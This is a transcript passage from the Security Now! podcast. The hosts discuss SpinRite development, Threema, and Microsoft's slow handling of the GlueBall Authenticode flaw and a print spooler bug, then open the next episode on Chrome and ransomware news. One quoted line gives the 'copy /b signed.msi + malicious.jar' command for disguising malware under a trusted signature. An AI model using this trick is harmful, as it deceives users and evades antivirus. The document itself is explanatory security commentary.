However, there's no beta.  We're not there yet.  I would say the technology is in beta, and I'll have something to say about that in a second.  But there isn't a SpinRite beta that is yet available.  There will be.  And existing SpinRite owners, anyone who has SpinRite 6, will be able to get access to the beta at no charge while it's getting packaged up and ready for release.  I'm not going to waste any time doing that, but it'll take some time.



And SpinRite owners in the newsgroup will at some point switch from using the freeware that we're using right now, this benchmark I've been talking about, to actually testing a pre-release version of SpinRite.  And I don't know how long it'll be between then and its official release, but there's no reason not to let people play with it.  So everyone who owns SpinRite will be able to use their existing serial number and transaction code in order to download it.



And this second one was just - I just got a kick out of this, Leo.  Max, he said.  "@SGgrc Steve, I have an air filter" - and I'm presuming he means like for his home HVAC, you know, his heater and air conditioning.  "I have an air filter with a BUILT-IN," in all caps, "Bluetooth IoT device.  An air filter."  He says:  "I can't believe I just paired my phone with an air filter."  So I thought that was kind of cool.  I did a little looking around.  It turns out there is one.  It's this little pod sitting on the middle of your classic heater/air circulating system in your home.



I didn't look to see anything more about it, but I would imagine, I mean, if it were my Bluetooth IoT device that I was designing for an air filter, I would be looking at the differential pressure from one side to the other.  And because the point is that as that air filter becomes clogged over time with just particulate dust, which is why you have it in the first place, the differential air pressure from one side to the other will increase because the filter will be blocking more from the suction of your HVAC, and at some point it could send an alert to your phone, which is presumably what it does, to say, "Time to change me, I'm getting dirty."  So anyway, I thought that was a little cool bit of IoT technology.



And a little bit of an update on SpinRite.  I was talking last week about the two different ways of reading a disk, the standard way of actually doing a read, which is what we've been benchmarking.  But one of the things that I started to benchmark was the concept of a verify, that the verify command is used instead of the read.  Essentially you tell the device that I want you to verify that you can read the following block of sectors, but don't bother sending it to me.



Well, so for a hard disk on a SATA link, that doesn't buy you much because the maximum transfer rate of today's state-of-the-art hard drives is slower than a SATA III link which is 6GB per second, or about 800MB per second.  No hard drives are able to actually physically transfer at 800MB per second.  They can't get there.  Is it 800 or 600?  Maybe it's 600MB per second.  I think it's 600MB per second.  I'm just pulling this off the top of my head.  But yes, it's six.  Still, they're not there.



Not so necessarily with SSDs.  In theory, if the SSD is parallel enough in its core, that is to say, if when you ask for a bunch of sectors, those sectors are all coming from non-volatile memory spread across the physical real estate, and if that memory is fast enough, it is theoretically possible for today's SSDs to exceed the speed of SATA III.  And in fact that's why there's the next generation way of talking to solid-state memory, so-called NVME, Non-Volatile Memory.  That's a different interface that can keep up with today's SSDs.  SATA III in some cases can't.



So the allure here was that this next forthcoming SpinRite might be able to detect if an SSD was actually doing a verify, and then just say, okay, verify yourself, and we're going to sit back and wait while you do that because, although you can't tell - you can only tell it to verify 32MB at a time, which is 65536 sectors.  And actually now we learned last week you really only can do half.  But I'm able to be much faster anyway, so we didn't lose any performance in cutting it down to 16K sectors, or 16MB transfers.  No loss of performance there.



So what the benchmarks seemed to be showing was really crazy high performance from SSDs, which was compelling because it would mean that SpinRite could have the SSD do the work.  And as soon as it coughed, then SpinRite would zero in on the problem and get to work there, and then tell the SSD, okay, keep going.  It turns out that the only, well, we always knew that the only way this would be possible, if we could absolutely guarantee that the SSD internally was truly doing the same work.  Then we could rely on that.



So late last week I developed the technology to test this.  I first asked everyone's drive to read one past its end and verify that it got an error; then to recover from the error; then read the last sector and verify that it didn't get an error; then save that data in case we need to restore it.  Then I deliberately caused that sector to be unreadable.  There's a command you can use to do that.  In the old days, there were so-called "long reads" and "long writes" where you could tell the hard drive, just give me all of the data.  Don't worry if you can't correct it.  I want it anyway.



Those days are over.  But it is still possible for maintenance purposes to tell a drive you want to mark a sector as unreadable.  So this test code marked the last sector as unreadable.  Then it tried to read it, and it verified that it could not.  Then it tried to verify it, and it verified that it could not.  Some drives said, yeah, it's fine, meaning that verify was a no-op.  They weren't actually doing the verify.



So we found some drives did not honor the mark unreadable, so we would be unable to check those.  Some drives that apparently did, apparently they said, yeah, no problem, I marked it unreadable.  Then both the read and the read verify succeeded, which meant it didn't actually mark it unreadable.  In some cases, the verify succeeded and the read didn't.



Anyway, what we learned was it was a mess, and SpinRite cannot use it.  So the good news is we're still going to be screamingly fast.  The bad news is we're not going to be able to go faster than a SATA III link.  On the other hand, the good news is a SATA III link can go at 600GB per second.  So SpinRite is still going to be extremely fast.  So that's where we are.  Great round of experiments.



And I'm at this point - I talked about, I remember you chuckled, Leo, when I said that for a couple hours last Sunday there were no known problems.  Well, we're back there now.  It is running flawlessly on every drive that everybody has on every system that they've got.  I think that the AHCI driver is nailed.  I've got bulk transfer working at the capacity of the SATA link in every case.  I've got now, as a result of this recent set of testing, I've got sector-level error induction and recovery and retry and all that.



So at this point I will now integrate all this with the work I did on the bus mastering IDE, and the AHCI when it's set to its legacy compatibility mode, and then pull this into a final benchmark.  And when it's ready, I will let all of our listeners know where they can go get it in order to play with it.  And of course my actual motivation is to get a much larger audience to give it a try so I can find problems now.  And of course their motivation for trying it is, if they find a problem, they want me to fix it because that will mean that SpinRite will be guaranteed to work for all the stuff they've got, as soon as it's released.



So a win-win for everyone.  And, well, except for people who hope that Microsoft will keep doing a good job.  We are, after our last break, going to talk about Microsoft's zero-day folly.



LEO:  Not a win for them.



STEVE:  Boy.



LEO:  So we were talking about Threema, and I know that you've always liked Threema a lot because of the way they handle keys.  It isn't open source.  But I was reading up on it, and they have a kind of an interesting way of verifying that they are using the NaCL, open source NaCL library properly.  So it's a complicated system, and you have to compile and install a C++ program, open source program that you can then verify.  But you're satisfied...



STEVE:  To duplicate what they're doing, yes.



LEO:  Duplicate the encryption.  So are you satisfied, though, that even though they're not fully open source - I kind of wish they were, like Signal is - that they are sufficiently open about how they're doing it to be safe?  Obviously you must.



STEVE:  Yeah.  And they're not free; right?  You have to pay them something.



LEO:  That's how they do it, yeah, you pay for it.



STEVE:  And so that's what I like.



LEO:  Right.



STEVE:  Yes.  I think rather than the problem Mozilla is facing, they said, look, we're going to give you really, really, really good security and ask for a little bit of one-time payment.



LEO:  It's not expensive, yeah.



STEVE:  No, it's not.



LEO:  And it's one-time only, yeah.



STEVE:  Yeah.



LEO:  And I know you like the three dots, where you shift keys.



STEVE:  Well, yeah.  What I like is that the Threema comes from  the three levels of verification, which is, okay, we have encryption, but we haven't verified.  We have encryption and we have verified.  And then the third one is we actually have the two devices looking at each other in the same physical location and did like a real-time meeting verification.



LEO:  Right.



STEVE:  So, yeah.



LEO:  You have to have Threema signing parties.  The reason I ask is I'm becoming less and less happy with Signal.  You know, the fact that they require to tie it to a real phone number I think is not good.  They're starting to do things that I feel like - and I guess it's for monetization reasons.  But for whatever reason I feel like they're a little bit less privacy focused.  So maybe I'll, I mean, Signal's a gold standard.  I don't think a lot of people know about Threema.  I don't hear a lot of talk about it.



STEVE:  Right.  And that's of course the problem.  It's easier if you say, hey, let's use WhatsApp.  It's like, oh, okay, fine.



LEO:  Yeah, everybody knows it, yeah.



STEVE:  And then next down is - or just, you know, what iOS has built in, iMessage.  We know that it's as secure as Apple can make it, except that, you know, they're managing the keys.



LEO:  If I showed my Threema, I guess it's a QR code, on camera here, would that be the equivalent of an in-person, I mean, people could presume I'm me.



STEVE:  I think it would be.  I think that, as I remember, the second level is you read a signature, like a short token that's created from your password, and then the third - it's been so long since I've looked.  But, yeah, I think if you held up your, you know, what you're showing them is your NaCL public key.



LEO:  Presumably they know it's me.



STEVE:  Yeah.



LEO:  And then you have a Threema ID which is uniquely generated, but it's not tied to any phone number, which I really like.  You don't have to link a phone number to it at all.



STEVE:  Right. 



LEO:  I think that's really cool.



STEVE:  And of course NaCL is the library.



LEO:  Yeah.



STEVE:  It's the one, you know, I built SQRL around, and it's the one that is being used by everybody.



LEO:  I trust NaCL.  My issue would be, because there is around it a binary blob, you know the encryption's now good, but you don't know what else is going on.  You could in theory have a binary blob that decrypted it and sent it to some third party, even if they're using NaCL and doing it properly; right?



STEVE:  Sure.



LEO:  Yeah, that's the problem with binary blobs.  Well, I'll put my - here's my QR code if anybody wants to make me a three dot.  Just take a picture of that with your phone.  It has to be me because here I am.  It's like you're in person.  It's like you're in person.  I've had Threema forever.



STEVE:  It's better than being in person.



LEO:  I'm practically right here.



STEVE:  Because it's COVID safe.



LEO:  You don't have to wear a mask.  And now let me just get my paddle out.



STEVE:  Oh, yes.



LEO:  It's time for the flogging.



STEVE:  It's difficult to know what to think of the fact pattern I'm going to lay out.  As we've noted before, it's one thing to make an honest mistake.  Anyone can.  It happens all the time, to all of us.  But when a company who we depend upon, like Microsoft, appears to be deliberately acting irresponsibly, that's a whole 'nother class of problem.



So the story begins last December, 2019, when Microsoft received a report for a serious vulnerability in Windows.  And it didn't come through some unknown channel.  It was relayed from an anonymous source through Trend Micro's official Zero Day Initiative (ZDI), which we've often talked about.  These guys are the real deal.  And Trend Micro was quite patient, and gave Microsoft a full six months to fix the problem.  Microsoft did nothing.  So after half a year of inaction from Microsoft, ZDI, as their policy permits, published an advisory on May 19th of this year.



And because this was the real deal, a serious vulnerability that Microsoft had for whatever reason chosen not to act upon for six months, the now public vulnerability was exploited the next day in an effort now called "Operation PowerFall."  An advanced threat actor exploited one of these two zero-day vulnerabilities that Microsoft patched last week in a targeted attack a few months ago.  That adversary chained two flaws in Windows, both which were unknown at the time of the attack, to achieve remote code execution and increase their privileges on a compromised machine.



As I noted above, this occurred in May and targeted at least one South Korean company.  We have no way of knowing who else might have been victimized by Microsoft's six months of inaction on this.  But Kaspersky picked up on at least this one attack, and they believe that it might be part of an operation known as DarkHotel.  This is a hacker group that likely is operating in one form or another for more than a decade.



Fortunately, Microsoft did then patch this now being actively exploited flaw the next month, three months ago, in June's Patch Tuesday.  The so-called Operation PowerFall attack leveraged a remote code execution vulnerability in IE11 that I just talked about earlier, which has just now been patched, and a flaw in Windows GDI Print and Print Spooler API which is what enabled a privilege escalation.  That's the one Microsoft sat on for six months and did nothing.



So this should strongly reinforce the idea that privilege escalation flaws are not nothing.  We've looked at this before.  We've talked about this before.  The sequence of events suggests that the attackers already knew of the IE11 remote code execution flaw which was patched last week.  The elevation of privilege, that was three months ago.  So the evidence suggests that they knew of the IE11 remote code execution flaw, and they were sitting on it because by itself it was impotent and useless without an accompanying escalation of privilege vulnerability.  Getting the privilege of the process under which IE was running wouldn't help them.  They needed to get root, and so they needed both a remote code execution flaw and to be able to elevate their privilege once they were running code.



So the instant they obtained the news from ZDI's disclosure, having waited six months, of an unpatched privilege escalation, they had everything they needed to launch the attack.  If someone inside Microsoft thought, oh, well, it's only a privilege escalation, we don't need to worry about that much, that person should be relieved of their responsibility for making such determinations.  And believe it or not, that's not the worst.



I started out by saying it's difficult to know what to think about the fact pattern I'm about to lay out.  Well, here's another one.  Part 2 is even more egregious.  Remember that other zero-day that was actively being exploited in the wild, which Microsoft referred to as a "spoofing vulnerability."  Okay?  It allows Microsoft installer, you know, .msi files, to be converted into malicious Java executables while retaining a legitimate company's digital signature.  That's what they're calling a "spoof."  And it's no laughing matter.  Believe it or not, this bug was reported to Microsoft precisely two years ago, on August 18th, 2018.  Today is August 18th of 2020.  Microsoft has known about this for two years, and they stated that they would not be fixing it.  What?  Yes.



They finally fixed it last week because it was being actively exploited in the wild.  So get this.  Two years ago, actually a little more than two years ago, a viral sample of an exploit that researchers at the time dubbed GlueBall was first uploaded to VirusTotal.  The fact that it was uploaded to VirusTotal means that it existed and was weaponized two years ago.  This wasn't some theoretical vulnerability.  This was real.  This was in the wild.  After it was analyzed, it was given the name GlueBall because a malicious Java .jar file had been glued onto the back of a valid install file signed by Google.  And even though this MSI file had been tampered with and renamed to .gar, and would now execute as a Java JAR, the Windows OS continued to consider the file to be signed with a valid Google certificate.  I have a picture of that certificate in the show notes.  There it is.  Digital signature is okay, signed by Google.



Now, some security researchers like to troll through VirusTotal looking for interesting submissions.  You never know what you're going to find.  It's naturally a very fertile territory.  And one such researcher was a guy named Bernardo Quintero, the founder of VirusTotal.  When Bernardo realized what it was that someone had submitted, he immediately reached out and contacted Microsoft, two years ago to the day, to report this clear flaw in the operation of Microsoft's Authenticode signing verification.  As we've discussed here, one of the ways security software, including Microsoft's, manages to deal with the flood of unknown malware is to use the reputation of any software's signature.



I've noted how, after obtaining my own new Authenticode signing certificate a year ago, my properly signed software started being flagged for a few weeks until enough people had downloaded it and run it and nothing bad had happened.  That initially new and unknown certificate had acquired a reputation.  And thus anything it signed now carried an assumption of trust.  That sort of heuristic is the only way we're able to stay afloat in this creaky leaking boat of an industry we have built for ourselves.  So it's easy to understand what it would mean if malware was able to piggyback onto something that Google had signed and thus obtained the inherent trust that Google had earned.  When such a malicious hybrid was downloaded and run, no warning bells would ring.



So as I said, though it bears repeating,  after discovering this flaw, Bernardo Quintero, the founder of VirusTotal, responsibly disclosed it to Microsoft two years ago to the day, on August 18th of 2018.  And he was told, nah, we're not going to fix it.  What?



Bernardo subsequently explained, this attack vector has been verified in the latest and updated versions of Windows 10 and Java, available at the time of writing, which was Windows 10 v1809 and Java SE Runtime Environment 8, Update 191.  Microsoft has decided, he wrote, that it will not be fixing this issue in the current versions of Windows and agreed we are able to blog about this case and our findings publicly.



So on January 15th, 2019, Bernardo blogged about this in a VirusTotal blog entry titled "Distribution of malicious JAR appended to MSI files signed by third parties."  He said, this is him speaking in the VirusTotal blog:  "Microsoft Windows keeps the Authenticode signature valid after appending any content to the end of a Windows Installer .msi file signed by any software developer.  This behavior can be exploited by attackers to bypass some security solutions that rely on Microsoft Windows code signing to decide if files are trusted."  Gee, what's the point of signing something with Authenticode?



Anyway, sorry.  He continues:  "The scenario is especially dangerous when the appended code is a malicious JAR because the resulting file has a valid signature according to Microsoft Windows, and the malware can be directly executed by Java."  Now he explains that.  "Code signing is the method of using a certificate-based digital signature to sign executables and scripts in order to verify the author's identity and ensure that the code has not been changed or corrupted since it was signed by the author."  Right.  Change one byte breaks the signature; right?  Digital signature, that's the way it works.  Different hash - anyway, we know.



"This way, for example, if you modify the content or append any data to a signed Windows PE" - you know, a dot executable, it's called Portable Executable, PE file - the signature of the resulting file will not be valid for Microsoft Windows, as expected.  This behavior changes when you append any data to the end of a signed Windows Installer .msi file.  The resulting file will pass the verification process of Microsoft Windows and will show just the original signature as valid without any warning.



"This behavior could be used to hide and distribute malicious code in MSI-signed files.  In fact, several security solutions rely on the output of Microsoft Windows code-signing validation to avoid an in-depth scan when the file has a valid signature by a well-known and trusted software developer."  So he's restating exactly what I was saying before.



"Such an attack vector is not very interesting if the resulting file is not designed to execute the attached payload because the attacker would need an additional component already running in the target to extract and execute the appended malicious code.  However, JAR files" - and maybe two years ago Microsoft just missed this fact?  I mean, it's the only thing I can understand is that someone said, oh, yeah, we know, you can stick stuff on the end of an MSI file, and it doesn't break the signature.  Yeah, we did that on purpose.  Maybe they didn't stop to consider Java.



Bernardo writes:  "However, JAR files have a characteristic that allows them to run directly in this scenario."  And I should point out that Bernardo did tell Microsoft two years ago.  Anyway, "...allows them to run directly in this scenario, making them the perfect candidate to take advantage of this situation.  A JAR file allows Java runtimes to efficiently deploy an entire application, including its classes and their associated resources, in a single request.



"The interesting part for exploiting the commented scenario is the JAR file format is based on ZIP to store the different components and resources, and this kind of ZIP is correctly identified by the presence of an end of central directory record which is located at the end of the archive to allow the easy appending of new files.  When Java opens a JAR file, it looks at the end instead of the beginning of the file, so a JAR file is executed independently of the data at the beginning of the file."  In other words, Java ignores whatever that was Google signed for the .msi.  It doesn't care.  It looks at the end.  And what do you know?  There's the ZIP directory telling it about the contents and where to find it in the file.



So he says:  "In addition, on Microsoft Windows systems, the Java Runtime Environment's installation program will register a default association for JAR files so that double-clicking a JAR file on the desktop will automatically run it with 'javaw -jar' as the arguments.  Dependent extensions bundled with the application will also be loaded automatically.  This feature makes the end-user runtime environment easier to use on Microsoft Windows systems."



So he finishes:  "In short, an attacker can append a malicious JAR to an MSI file signed by a trusted software developer like Microsoft, Google, or any other well-known developer, and the resulting file can be renamed with a .jar extension and will have a valid signature according to Microsoft Windows."



LEO:  That's so bad.



STEVE:  For example, via the command just "copy /b signed.msi + malicious.jar," copy it to "signed_malicious.jar."  That is, just simply physically concatenate them.  That's all it takes.



LEO:  Geez.



STEVE:  The victim can be infected with just a double-click on such a file, Leo.  And for two years Microsoft, eh.  Until it was found being exploited.



LEO:  Wow.



STEVE:  So since we now know that someone had been found to be actually doing this, thanks to Microsoft's admission that this """zero-day""" - and I've got that in triple double quotes in the show notes - has been actively used in the wild, we must ask ourselves what could Microsoft have possibly been thinking - or is the term "thinking" way too generous here - when they decided not to fix this two years ago?  Most of the world has been using Windows for these two years, while it's been public knowledge that a Java JAR file can be tacked onto the end of any signed and trusted MSI installer file, renamed with a JAR extension, and it will then slide right past any AV system that says to itself, oh, I don't know what that file is.  Haven't seen it before.  But look, Google signed it.  So okay.  An objective observer would have to conclude that today's Microsoft is not yesterday's Microsoft.



So finally, as of just last week, the patch for what is being called CVE-2020-1464, Windows will no longer, finally, consider MSI files to be properly signed if they have been tampered with by having a JAR file appended to them.  So literally, they finally, after two years, added a special case just for this.  And is it even right to call this a zero-day?  This appears to have been officially sanctioned behavior by Microsoft for the past two years, until now.  A zero-day is supposed to be a surprise.  But this wasn't.



LEO:  730 days, I guess.



STEVE:  Exactly.



LEO:  So the thing that baffles me is a certificate should in some way encompass what it's attached to.



STEVE:  Uh-huh, yes.



LEO:  Like with a hash, saying this certificate belongs to this file.  Otherwise it sounds like there's no safeguard against the certificate itself being detached and put somewhere else.



STEVE:  It's nuts.



LEO:  You can absolutely say here's the hash of the thing we're attached to.  If these don't match, the certificate's no good.



STEVE:  Right.



LEO:  It doesn't even make sense not to do that.  What's the point of a certificate?



STEVE:  Right.



LEO:  It's like, oh, I'm going to glue a piece of paper on here that says "Genuine."  It doesn't have any meaning.



STEVE:  Wait a minute.  Come to think of it, I've seen stickers like that on my laptops.



LEO:  Yeah, genuine.  It doesn't - it's meaningless.



STEVE:  Whoa, yeah, look, it's got a hologram.



LEO:  Right?  I mean, isn't that the whole idea of what a certificate is, is it's certifying that the contents of this file are unchanged and attached to this ownership.



STEVE:  Yes.



LEO:  It sounds like - and I hope it's more than just a malicious JAR file's been glommed onto here.  I hope that it's if the file's been modified in any way.  That's what makes me think there must be some functionality.  This is always the case with Microsoft.  There's some functionality they were protecting.



STEVE:  Well, exactly.  So first of all, the exception to what you're saying, like the hash of everything but the certificate, .msi is the exception.  So if this was an EXE that was signed, you can't touch a byte.  You can't touch it at all.



LEO:  So why is there an MSI exception?  There must be some, like, we want you to be able to modify this without recertifying it.



STEVE:  Well, put stuff on the end, hang other crap on afterwards.  I mean, that's what this does.  And I do think that Microsoft had to be protecting that function for some reason.



LEO:  Yeah.



STEVE:  But it must have been that poor Bernardo was saying, but, but, but, but, but...



LEO:  But it's not even sophisticated.  It's a copy command that it concatenates a file with a Java file.



STEVE:  It's a copy command that glues them together.



LEO:  And then renames it.



STEVE:  That's why they called it the GlueBall attack.



LEO:  It's so stupid.  I don't even know.  I guess a JAR, if you rename it JAR, then Java will just search through the whole binary until it finds main and then say, good, I'll execute here?  Because it's got a...



STEVE:  Actually, it's even better than that.  If you rename it JAR, then Java opens - it looks at the end, where the dictionary is.



LEO:  Oh.



STEVE:  That tells it where to find everything else.  It ignores the whole front.



LEO:  So that's why it works well with Java.  It would work with any language that says, well, let me look at the end.



STEVE:  Yeah.



LEO:  Oh, my god.  So bizarre.  So MSI files are the installer files for Microsoft.



STEVE:  Right.



LEO:  And they're widely used.



STEVE:  Yes.



LEO:  There must have been some functionality where you could - oh, I know what it is.  I just thought of what it is.  Localization.



STEVE:  Yes.  Different language packs.



LEO:  So you'd attach a language pack to the end.  Now, you don't want to have to get the whole thing recertified just because I've added a language pack.



STEVE:  Yup.



LEO:  So you go, well, the certificate applies.  You can add any localizations you want.  I bet you it's something like that.



STEVE:  Right, right.



LEO:  Wow.



STEVE:  And they made an exception, and the exception bit them.  And they ignored a clear problem for two years.



LEO:  Wow.



STEVE:  Just because they said, no, we know you can put crap on the end of MSI.  We don't care.



LEO:  That's very Microsoft because one of the keys to Microsoft is not to break existing implementations.  You never want to break legacy.  Even if there's a security reason to do it.  You never want to - because some big, you know, Oracle or somebody, some big company has created a whole bunch of files, and this would break everything.  They'd have to get new certs.



STEVE:  Probably is Oracle, actually, because they're Java parents.



LEO:  Yeah.  Wow.  Wow.  What a story.



STEVE:  But, gee, somebody's actually installing malware with it?  Oh.



LEO:  Sorry.  We'd like to.



STEVE:  I guess we should patch it.



LEO:  We'd like to fix it.



STEVE:  We'd like to patch it right now.  We'll just get in a big hurry to patch it.



LEO:  Yeah, I mean, this is...



STEVE:  That Chromebook's looking sweeter every minute.



LEO:  I know.  Linux.  The nice thing about Linux, it's made by a bunch of cranky people who say, but no, this is the right way to do it.  I don't care if it breaks your application.  We're doing it this way, and suck it.  And Microsoft, they're just too nice.  They're just too nice.



STEVE:  Oh, that's right.  "Nice" is the word I would use.  That's right.



LEO:  Somebody in the chatroom, MikeyLikesIt, says "I create MSI files.  The language packs can be built as a separate file time MSN.  And during runtime the contents of the MSN get streamed into the MSI."  So it probably is for localization.  Oh, my, my, my.  So, Steve, you've done it again.  You've used up your time wisely, very wisely, very usefully.



STEVE:  And the lights stayed on.



LEO:  Well, yeah.  But we're going to run to All About Android and try to get as much of that show in before they go out because it is getting - I'm watching the power usage in the state of California creep towards that magic line where they say there's no more.  Run out, you've run out.  And it's getting real close as we get hotter and hotter.



Steve Gibson's at GRC.com.  Power's still on there, anyway.  Go down and get yourself a copy of SpinRite, the world's best hard drive recovery and maintenance utility, getting better all the time.  Soon with AHCI support built right in.  That'll be version 6.1, which you will get for free if you buy SpinRite today.



We also would encourage you as you're there to get a copy of the show.  He's got 16Kb versions for the bandwidth impaired.  He also has 64Kb audio.  And he has transcripts, the only place you can get the transcripts of the show.  They're very well done by Elaine Farris.  All at GRC.com, along with all the other freebies Steve gives away all the time.



We have a copy of audio and video of the show at our website, TWiT.tv/sn.  You can also subscribe in your favorite podcast application, audio or video.  That way you'll get it automatically.  You should start collecting all 780.  You know, you could say, oh, I didn't start till Year 16.  That would be okay.  But start now.  There's another many, many shows to come, and you're going to want all of them.



We do the show every Tuesday, 1:30 Pacific, 4:30 Eastern, 20:30 UTC, if you want to watch us do it live.  TWiT.tv/live has the streams.  Thanks, Steve.  Have a great week.  Stay cool.  Keep the lights on.  We'll see you next time on Security Now!.



STEVE:  Thanks, buddy.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#781

DATE:		August 25, 2020

TITLE:		SpiKey

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-781.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at a new Chrome remote code execution flaw, some interesting news of three new ransomware victims, an emergency patch from Microsoft, the emergence of amateur RDP exploiters, the 15th birthday of the Zero Day Initiative, finally a good Windows 10 garbageware remover, recommendations of several of my most recommended remote networking utilities, then a bit of miscellany and SpinRite news.  Then, finally, we examine a really terrific new high-tech hack against low-tech locks and their keys.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Coming up, what do the University of Utah, Jack Daniels, and Carnival Cruise Lines have in common?  Steve has the answer.  We'll also talk about the number one way ransomware gets on your system.  It's not what you think.  Steve has an explanation.  And then we'll take a look at an amazing bit of research showing how you can pick a lock just by listening.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 781, recorded Tuesday, August 25, 2020:  SpiKey.



It's time for Security Now!, the show where we cover your safety, your privacy, your security online with our majordomo, the man in charge, Mr. Steve Gibson.  Hello, Steve.



STEVE GIBSON:  Yo, Leo.



LEO:  Good to see you.



STEVE:  I did confirm that this is the launch of Year 16. 



LEO:  Wow.  



STEVE:  It was August 19th, which was last Wednesday, of 2005 that was our maiden voyage on this journey that you proposed 15 years ago.



LEO:  Thank god you didn't have a crystal ball.



STEVE:  No, this has been, Leo, you're one of my longest lasting relationships.



LEO:  Same here.  Same here.  And I've never cheated on you, Steve, not once.  So there.



STEVE:  Wait a minute.  There have been others.



LEO:  There have been others.  Okay, there have been others, yes.



STEVE:  I happen to know there have been others.



LEO:  I've spoken to Bruce Schneier.



STEVE:  But I've been able to share in those experiences, as well.



LEO:  That's true.  In fact, we've got another one... 



STEVE:  Strange relationship.  Strange relationship.



LEO:  ...coming up, you and I.  We're going to be doing an event in October to celebrate security month.



STEVE:  Yes, October 1st.  October 1st.



LEO:  Yeah, that'll be good.  We'll have details of that.



STEVE:  Until then we have a little bit of a play on words.  And it's not my play on words, it's theirs, SpiKey, S-p-i-capital K-e-y.  We're going to talk about an incredibly cool bit of technology and an opportunity to sort of step back a little bit and look at the landscape of the whole, like, low-tech meets high-tech, essentially.  But we'll get to that.  First we're going to talk about a new Chrome remote code execution flaw which happily people will be patching when they move to Chrome 85.  I forgot to look and see whether I'm on 85 today.  It's supposed to be happening today.



We also have some interesting news of three new ransomware victims, some two of the three very well known; an emergency patch from Microsoft and a little bit of the back story around that; the emergence of amateur remote desktop protocol exploiters; and, weirdly coincident with this podcast's 15th birthday, which occurred - was it last week or this week?  Anyway, I get - these zero-based or one-based issues are a constant source of programming bugs and also brain bugs for me.  Anyway, the 15th birthday of the Zero Day Initiative.  Actually, I guess it would have been last week because theirs happened one day after ours.



LEO:  This is the world's first null-terminated podcast, so I understand your confusion, yeah.



STEVE:  That's perfect, yes, very good.  We also have, I found, finally, a good Windows 10 garbageware remover that I'm going to talk about.  I'm going to offer some recommendations of several of my most successful remote networking utilities.  We've got a bit of miscellany, some SpinRite news, and then we're finally going to examine a really terrific new high-tech hack against low-tech locks and keys.  And of course we've got a really good...



LEO:  Funny, very funny Picture of the Week this week, yeah.



STEVE:  Yeah, yeah.



LEO:  And also apropos.  Great.  I'm excited.  Another great show in the offing.  Picture of the Week?



STEVE:  So, yeah.  It's a four-frame cartoon.  The first one shows the very familiar Internet Explorer "e" with some weird black shrouded hand, skeleton hand, trying to pull it offscreen.  And the hand gives up and sort of breaks free.  And then we see in the third frame that we have the Grim Reaper.  And Grim Reaper is saying - oh, and in the first frame it says "It's time to go."  And the Internet Explorer resists, apparently.  And so then the Grim Reaper in the third frame says, "Let's go."  And then the fourth frame is "Internet Explorer is not responding."



LEO:  Very familiar.



STEVE:  Which, yes, which is familiar to us all.  And the Grim Reaper is puzzled that it's unable to remove it.  And this was apropos of something that I meant to talk about last week, but didn't.  Because just under a year from now, on August 17th of 2021, the use of IE11, our last IE, will no longer be supported for Microsoft's online services like Office 365, OneDrive, Outlook, and more.  And of course this is significant.  We often hear Paul and Mary Jo talking about how corporations have built IE in as a component of their infrastructure, with custom apps and things.  It's all glued in.  And they've got a year until it really stops being supported.  And also Microsoft will be ending support for IE11 with Microsoft Teams web app later this year, and all support ending on November 30th.



So the clock is ticking, and corporations really need to be looking at Edge.  Now, I don't know whether the IE11 compatibility mode built into Edge will continue or not.  But for what it's worth, standalone IE, you know, sooner or later the Grim Reaper is going to succeed.  And in fact that Grim Reaper may actually be named Microsoft.



Google Chrome users should today be moving to Chrome 85.  Most users don't need to do anything, which is good.  It just updates itself.  But this will fix a potentially serious remote code execution vulnerability in Chrome's WebGL rendering engine.  It's a use-after-free read flaw which was discovered by Cisco's Talos security group, and it was responsibly reported to Google more than three months ago, back on May 19th.  Google quickly put the fix into their early-release cycle in the Dev and the Beta channels just a couple weeks later, in early June.  And the stable channel, which I and most of us use, is expected to be receiving that fix today when Chrome moves from 84 to 85.



I looked last night, I was on 84.  I actually, I could look right now, come to think of it, because I've got Chrome right here.  Let's see.  Help > About and checking.  Oh, updating Google Chrome, yes.  I'm still on 84, but in a few moments I will be on 85.  So you may need to go to Help > About to kind of give it a little kick.  That sometimes is necessary.



LEO:  I think if you close it, right, it will download it.  And then if you close it, it will re-up.  But most of us never close our browsers.



STEVE:  That's right.  For me, Firefox is just open statically, and you need to go to Help > About, and then it goes, oh, yeah, thanks for asking, and then it updates itself and sometimes needs to do a - typically needs to close and then reopen with all the tabs surviving, fortunately, because as we saw last week I need all of those thousand tabs that I have open.  No, it's not a thousand, but it has a scroll bar.  So, yeah, wouldn't fit on one screen.



So what do the University of Utah, Jack Daniels Whiskey, and Carnival Cruise Lines all have in common?  Well, Friday, last Friday, the University of Utah revealed that it had paid a ransomware gang $457.59.



LEO:  No, 457,000.



STEVE:  Yes, sorry.  I got confused at the comma.



LEO:  That would have been a bargain.



STEVE:  $457,059.



LEO:  Small difference.



STEVE:  Which sort of begs the question, where did they get that number, now that I finally got it out correctly: $457,059.



LEO:  It's probably the bitcoin conversion.  Yeah, like half a million bucks.  It's like the bitcoin conversion thing.  It probably was a certain...



STEVE:  Yeah, it had to have been that.



LEO:  A hundred bitcoins or something.



STEVE:  Yes, some round number of bitcoin that turned out to be that.  And what's interesting is that was not to obtain the decryption key for their files.  They didn't need it because it turns out that very few of their files were encrypted.  But rather - and Leo, I know this goes to the thing where you just kind of like grit your teeth - to purchase the promise from the extortionists that the student information that had been exfiltrated beforehand...



LEO:  Oh, boy.  Oh, wow.



STEVE:  Yeah.



LEO:  That's so bad.



STEVE:  Would not be publicly released.



LEO:  You're going to see more and more of this one.  This is big.



STEVE:  Yeah.  So they're hoping that there is honor among thieves and that these guys will keep their word.



LEO:  Incentive to keep your word is that, if you want others to pay you - right?



